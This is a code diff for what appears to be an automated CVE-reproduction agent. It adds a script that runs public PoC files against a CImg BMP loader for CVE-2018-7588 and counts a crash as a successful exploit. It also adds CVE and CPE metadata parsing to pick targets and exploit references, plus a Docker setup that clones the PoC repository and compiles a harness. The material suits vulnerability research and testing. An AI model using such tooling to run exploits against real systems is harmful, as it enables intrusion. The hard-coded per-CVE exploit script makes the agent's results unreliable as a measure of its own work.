@@ -235,6 +235,77 @@ def main() -> None:
 if __name__ == "__main__":
     main()
 """
+    if cve_id == "CVE-2018-7588":
+        return """import os
+import subprocess
+import sys
+
+TARGET_BIN = "/tmp/cimg_bmp_loader"
+POC_ROOT = "/opt/pocs/cimg"
+PREFERRED_PAYLOADS = [
+    "cimg-heap-overflow-load_bmp-48427",
+    "cimg-heap-overflow-load_bmp-48457",
+    "cimg-double-free-1",
+]
+
+def find_payloads() -> list[str]:
+    payloads = []
+    for root, _, files in os.walk(POC_ROOT):
+        for name in files:
+            if name.lower().endswith(".md"):
+                continue
+            payloads.append(os.path.join(root, name))
+    payloads.sort()
+    priority = [os.path.join(POC_ROOT, name) for name in PREFERRED_PAYLOADS]
+    prioritized = [path for path in priority if path in payloads]
+    remaining = [path for path in payloads if path not in prioritized]
+    return prioritized + remaining
+
+def run_payload(payload: str) -> bool:
+    print(f"trying payload: {payload}")
+    try:
+        result = subprocess.run(
+            [TARGET_BIN, payload],
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+    except subprocess.TimeoutExpired:
+        print("payload timed out")
+        return False
+
+    if result.stdout:
+        print(result.stdout)
+    if result.stderr:
+        print(result.stderr)
+
+    if result.returncode < 0 or result.returncode in (134, 139):
+        print(f"crashed with exit status {result.returncode}")
+        print("exploit successful")
+        return True
+
+    print(f"payload returned {result.returncode}")
+    return False
+
+def main() -> None:
+    if not os.path.exists(TARGET_BIN):
+        print(f"target binary not found: {TARGET_BIN}")
+        raise SystemExit(1)
+
+    payloads = find_payloads()
+    if not payloads:
+        raise FileNotFoundError(f"No payload files found under {POC_ROOT}")
+
+    for payload in payloads:
+        if run_payload(payload):
+            return
+
+    print("exploit did not trigger crash")
+    raise SystemExit(1)
+
+if __name__ == "__main__":
+    main()
+"""
     return ""
 
 
@@ -853,7 +924,8 @@ class CyberAttackAgentWrapper:
         )
 
     def _extract_cve_references(self, cve_data: Dict[str, Any]) -> List[str]:
-        refs = cve_data.get("references", [])
+        root = cve_data.get("cve", cve_data)
+        refs = root.get("references", [])
         urls = []
         for ref in refs:
             if isinstance(ref, dict) and ref.get("url"):
@@ -862,14 +934,46 @@ class CyberAttackAgentWrapper:
 
     def _extract_cpe_criteria(self, cve_data: Dict[str, Any]) -> List[str]:
         criteria = []
-        for config in cve_data.get("configurations", []):
-            nodes = config.get("nodes", []) if isinstance(config, dict) else []
-            for node in nodes:
+        root = cve_data.get("cve", cve_data)
+
+        def walk_nodes(nodes: List[Dict[str, Any]]) -> None:
+            for node in nodes or []:
                 for match in node.get("cpeMatch", []):
                     value = match.get("criteria")
                     if value:
                         criteria.append(value)
+                walk_nodes(node.get("nodes", []))
+
+        for config in root.get("configurations", []):
+            nodes = config.get("nodes", []) if isinstance(config, dict) else []
+            walk_nodes(nodes)
         return criteria
+
+    def _summarize_cpe_targets(self, cpe_criteria: List[str]) -> List[Dict[str, Optional[str]]]:
+        summaries: List[Dict[str, Optional[str]]] = []
+        seen = set()
+        for criteria in cpe_criteria:
+            parts = criteria.split(":")
+            if len(parts) < 6:
+                continue
+            target_type = parts[2] if len(parts) > 2 else None
+            vendor = parts[3] if len(parts) > 3 else None
+            product = parts[4] if len(parts) > 4 else None
+            version = parts[5] if len(parts) > 5 else None
+            key = (target_type, vendor, product, version)
+            if key in seen:
+                continue
+            seen.add(key)
+            summaries.append(
+                {
+                    "target_type": target_type,
+                    "vendor": vendor,
+                    "product": product,
+                    "version": version,
+                    "criteria": criteria,
+                }
+            )
+        return summaries
 
     def resolve_cve_target_step(self, context: AgentContext) -> AgentContext:
         """Extract target reproduction evidence from CVE metadata and RAG context."""
@@ -885,10 +989,20 @@ class CyberAttackAgentWrapper:
             description = orchestrator._extract_description(context.cve_data) or ""
             references = self._extract_cve_references(context.cve_data)
             cpe_criteria = self._extract_cpe_criteria(context.cve_data)
+            cpe_targets = self._summarize_cpe_targets(cpe_criteria)
             source_refs = [
                 url for url in references
                 if any(host in url.lower() for host in ["github.com", "gitlab.com", "sourceforge.net"])
             ]
+            exploit_refs = [
+                url for url in references
+                if any(token in url.lower() for token in ["exploit-db", "/pocs", "/issues/", "github.com/xiaoqx/pocs"])
+            ]
+
+            primary_target = next((target for target in cpe_targets if target.get("target_type") == "a"), None)
+            version_hint = primary_target.get("version") if primary_target else None
+            if version_hint in {"*", "-", ""}:
+                version_hint = None
 
             context.cve_target_info = {
                 "cve_id": context.cve_id,
@@ -896,14 +1010,20 @@ class CyberAttackAgentWrapper:
                 "description": description,
                 "references": references,
                 "source_references": source_refs,
+                "exploit_references": exploit_refs,
                 "cpe_criteria": cpe_criteria,
+                "cpe_targets": cpe_targets,
+                "primary_target": primary_target,
+                "product_hint": primary_target.get("product") if primary_target else None,
+                "vendor_hint": primary_target.get("vendor") if primary_target else None,
+                "version_hint": version_hint,
                 "rag_context": context.rag_context,
                 "missing_fields": [],
             }
 
             if not cpe_criteria:
                 context.cve_target_info["missing_fields"].append("affected_product_or_version")
-            if not source_refs:
+            if not source_refs and not exploit_refs:
                 context.cve_target_info["missing_fields"].append("source_or_build_reference")
 
             context.current_state = WorkflowState.CVE_TARGET_RESOLVED
@@ -935,6 +1055,52 @@ class CyberAttackAgentWrapper:
                 }
                 context.current_state = WorkflowState.REPRODUCTION_PLANNED
                 context.log_step("CVE reproduction planned: system unzip target in Docker")
+                return context
+
+            if context.cve_id == "CVE-2018-7588":
+                version_hint = str(context.cve_target_info.get("version_hint") or ".220").strip()
+                cimg_tag = version_hint if version_hint.startswith("v") else f"v{version_hint}"
+                context.reproduction_plan = {
+                    "strategy": "system_package_tool",
+                    "tool_name": "cimg_bmp_loader",
+                    "executable_path": "/tmp/cimg_bmp_loader",
+                    "setup_commands": [
+                        "apt-get update -qq",
+                        "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends g++ git ca-certificates >/tmp/cimg_setup.log 2>&1 || (cat /tmp/cimg_setup.log && exit 1)",
+                        f"git clone --depth 1 --branch {cimg_tag} --quiet https://github.com/GreycLab/CImg.git /opt/CImg",
+                        "git clone --depth 1 --quiet https://github.com/xiaoqx/pocs.git /opt/pocs",
+                        """cat >/tmp/cimg_bmp_loader.cpp <<'EOF'
+#define cimg_display 0
+#include "/opt/CImg/CImg.h"
+#include <exception>
+#include <iostream>
+
+using namespace cimg_library;
+
+int main(int argc, char** argv) {
+    if (argc < 2) {
+        std::cerr << "usage: " << argv[0] << " <bmp-path>" << std::endl;
+        return 1;
+    }
+
+    try {
+        CImg<unsigned char> image(argv[1]);
+        std::cout << "loaded image: " << image.width() << "x" << image.height() << std::endl;
+        return 0;
+    } catch (const cimg_library::CImgException& e) {
+        std::cerr << e.what() << std::endl;
+        return 1;
+    } catch (const std::exception& e) {
+        std::cerr << e.what() << std::endl;
+        return 1;
+    }
+}
+EOF""",
+                        "g++ -O0 -g /tmp/cimg_bmp_loader.cpp -o /tmp/cimg_bmp_loader -lpthread",
+                    ],
+                }
+                context.current_state = WorkflowState.REPRODUCTION_PLANNED
+                context.log_step("CVE reproduction planned: CImg BMP loader target in Docker")
                 return context
 
             missing = context.cve_target_info.get("missing_fields", [])
